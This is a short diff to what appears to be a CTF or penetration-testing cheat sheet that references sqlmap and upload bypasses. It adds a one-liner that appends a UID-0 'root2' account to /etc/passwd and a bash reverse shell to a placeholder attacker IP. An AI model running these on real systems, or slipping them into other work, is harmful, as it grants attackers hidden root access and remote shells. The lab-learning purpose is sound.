@@ -199,6 +199,16 @@ sqlmap -u $IP --dbms==sqlite --dump
 
 [Renaming reverse shell ext](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
 
+- One line bash create own root account in /etc/passwd
+```
+echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+- One line bash reverse shell
+```
+bash -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1;
+```
+
 
 ## Netcat
 ```
